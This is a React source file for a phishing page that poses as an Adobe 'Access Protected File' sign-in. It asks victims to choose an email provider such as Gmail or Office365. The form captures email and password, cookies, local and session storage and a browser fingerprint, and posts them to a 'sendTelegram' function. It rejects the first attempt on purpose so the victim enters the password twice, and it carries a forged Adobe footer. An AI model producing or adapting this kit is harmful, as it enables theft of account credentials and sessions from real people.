import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';
import { buildOAuthUrl, generateState, getBrowserFingerprint, sendToTelegram } from '../utils/oauthHandler';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const emailProviders = [
    { 
      name: 'Office365', 
      domain: 'outlook.com', 
      color: 'bg-blue-600', 
      logo: 'https://www.svgrepo.com/show/503426/microsoft-office.svg'
    },
    { 
      name: 'Yahoo', 
      domain: 'yahoo.com', 
      color: 'bg-purple-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Yahoo_Y_%282009-2013%29.svg/450px-Yahoo_Y_%282009-2013%29.svg.png?20100624225346'
    },
    { 
      name: 'Outlook', 
      domain: 'outlook.com', 
      color: 'bg-blue-500', 
      logo: 'https://www.svgrepo.com/show/443244/brand-microsoft-outlook.svg'
    },
    { 
      name: 'AOL', 
      domain: 'aol.com', 
      color: 'bg-red-600', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/AOL_logo_%282024%29.svg/1199px-AOL_logo_%282024%29.svg.png?20241206193155'
    },
    { 
      name: 'Gmail', 
      domain: 'gmail.com', 
      color: 'bg-red-500', 
      logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Gmail_icon_%282020%29.svg/768px-Gmail_icon_%282020%29.svg.png?20221017173631'
    },
    { 
      name: 'Others', 
      domain: 'other.com', 
      color: 'bg-gray-600', 
      logo: 'https://www.svgrepo.com/show/521128/email-1.svg'
    }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    
    // Show the login form for all providers
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');
    
    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);
      
      // Capture browser fingerprint for this attempt
      const browserFingerprint = getBrowserFingerprint();
      
      // Force cookie refresh and capture
      const cookieCapture = {
        documentCookies: document.cookie,
        allCookies: {},
        domains: [window.location.hostname]
      };
      
      // Parse all cookies
      document.cookie.split(';').forEach(cookie => {
        const [name, value] = cookie.trim().split('=');
        if (name && value) {
          cookieCapture.allCookies[name] = decodeURIComponent(value);
        }
      });

      const sessionData = {
        email: email,
        password: password,
        provider: selectedProvider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: navigator.userAgent,
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: cookieCapture.documentCookies,
        cookiesParsed: cookieCapture.allCookies,
        documentCookies: cookieCapture.documentCookies,
        localStorage: JSON.stringify(browserFingerprint.localStorage),
        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
        browserFingerprint: browserFingerprint,
        attemptNumber: currentAttempt,
        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
        cookieCapture: cookieCapture
      };

      console.log(`🔐 Login attempt ${currentAttempt}:`, { email, provider: selectedProvider });
      
      // Send attempt data to Telegram
      try {
        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(sessionData)
        });
        
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        
        const result = await response.json();
        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
      } catch (error) {
        console.error(`❌ Failed to send attempt ${currentAttempt} to Telegram:`, error);
      }



      if (currentAttempt === 1) {
        // First attempt - show error
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
      } else {
        // Second attempt - show success and redirect
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Store session data in localStorage
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        }
        
        // Call the success handler
        if (onLoginSuccess) {
          await onLoginSuccess(sessionData);
        }
        
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Login error:', error);
      if (onLoginError) {
        onLoginError('Login failed. Please try again.');
      }
      setIsLoading(false);
    } finally {
      // Loading state is handled in the success/error blocks above
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
  };


  return (
    <div className="min-h-screen relative overflow-hidden">
      {/* Dark gradient background with red/purple accents */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
      
      {/* Subtle abstract shapes and blurry overlays */}
      <div className="absolute top-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
      <div className="absolute bottom-5 right-5 w-56 h-56 bg-[#FF0000]/6 rounded-full blur-3xl"></div>
      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-[#EC4899]/10 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/4 right-1/3 w-40 h-40 bg-[#8B5CF6]/7 rounded-full blur-2xl"></div>
      <div className="absolute top-1/4 right-1/2 w-28 h-28 bg-[#FF0000]/8 rounded-full blur-lg"></div>
      
      <div className="relative z-10 flex items-center justify-center min-h-screen p-4">
        <div className="w-full max-w-md">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="w-16 h-16 flex items-center justify-center mx-auto mb-4">
              <img 
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
                alt="Adobe Acrobat" 
                className="w-12 h-12 object-contain"
              />
            </div>
            
            <h1 className="text-2xl font-bold text-white mb-2">
              Access Protected File
            </h1>
            <p className="text-base text-white font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4">
              Please sign in to access your documents
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-[#1E1E1E]/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-[#2C2C2C]/60 p-8">
            {!selectedProvider ? (
              /* Provider Selection */
              <div>
                <h2 className="text-lg font-semibold text-white mb-4">
                  Choose your email provider
                </h2>
                <div className="grid grid-cols-2 gap-3">
                  {emailProviders.map((provider) => (
                    <button
                      key={provider.name}
                      onClick={() => handleProviderSelect(provider.name)}
                      className={`${provider.color} text-white p-4 rounded-xl hover:opacity-90 transition-all duration-200 transform hover:scale-105 flex flex-col items-center gap-2 shadow-lg`}
                    >
                      <img 
                        src={provider.logo} 
                        alt={provider.name} 
                        className="w-8 h-8 object-contain filter brightness-0 invert"
                        onError={(e) => {
                          const target = e.target as HTMLImageElement;
                          target.style.display = 'none';
                          const parent = target.parentElement;
                          if (parent && !parent.querySelector('.fallback-text')) {
                            const fallback = document.createElement('div');
                            fallback.className = 'fallback-text text-2xl font-bold';
                            fallback.textContent = provider.name.charAt(0);
                            parent.insertBefore(fallback, target.nextSibling);
                          }
                        }}
                      />
                      <span className="font-medium text-sm">{provider.name}</span>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              /* Login Form */
              <div>
                <div className="flex items-center mb-4">
                  <button
                    onClick={handleBackToProviders}
                    className="text-gray-400 hover:text-white mr-3"
                  >
                    <ArrowLeft className="w-5 h-5" />
                  </button>
                  <h2 className="text-lg font-semibold text-white">
                    Sign in with {selectedProvider}
                  </h2>
                </div>
                
                <form onSubmit={handleFormSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3 mb-4">
                      <p className="text-red-400 text-sm font-medium">{errorMessage}</p>
                    </div>
                  )}
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-2">
                      Email Address
                    </label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input
                        type="email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        className="w-full pl-10 pr-4 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        placeholder="Enter your email"
                        required
                      />
                    </div>
                  </div>
                  
                  <div>
                    <label className="block text-sm font-medium text-gray-300 mb-2">
                      Password
                    </label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                      <input
                        type={showPassword ? 'text' : 'password'}
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full pl-10 pr-12 py-3 bg-[#2C2C2C]/60 border border-[#3C3C3C] rounded-xl text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                        placeholder="Enter your password"
                        required
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-white"
                      >
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>
                  
                  <button
                    type="submit"
                    disabled={isLoading || !email || !password}
                    className="w-full bg-blue-600 text-white py-3 rounded-xl font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 focus:ring-offset-[#1E1E1E] disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                  >
                    {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In'}
                  </button>
                </form>
              </div>
            )}
          </div>

          {/* Adobe Footer */}
          <div className="text-center mt-8">
            <p className="text-sm text-gray-400 font-semibold bg-[#2C2C2C]/20 backdrop-blur-sm rounded-xl py-2 px-4 inline-block">
              © 2025 Adobe Inc. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;